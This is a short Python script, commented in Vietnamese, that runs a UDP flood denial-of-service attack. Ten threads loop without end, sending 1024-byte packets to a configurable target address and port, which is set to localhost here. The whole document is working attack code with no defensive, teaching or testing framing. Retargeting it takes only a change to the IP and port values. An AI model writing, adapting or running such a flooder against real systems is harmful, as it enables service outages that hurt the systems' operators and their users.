import socket
import threading
import random
import time

target_ip = "127.0.0.1"  # Địa chỉ IP mục tiêu
target_port = 5000  # Cổng mục tiêu
message = b"A" * 1024  # Tạo gói tin UDP với kích thước 1024 byte
num_threads = 10  # Số lượng luồng để gửi gói tin

def udp_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message, (target_ip, target_port))
            sock.close()
        except Exception as e:
            print(f"Error: {e}")

# Tạo và bắt đầu nhiều luồng để gửi gói tin
threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=udp_flood)
    thread.start()
    threads.append(thread)

# Giữ chương trình chạy
while True:
    time.sleep(1)
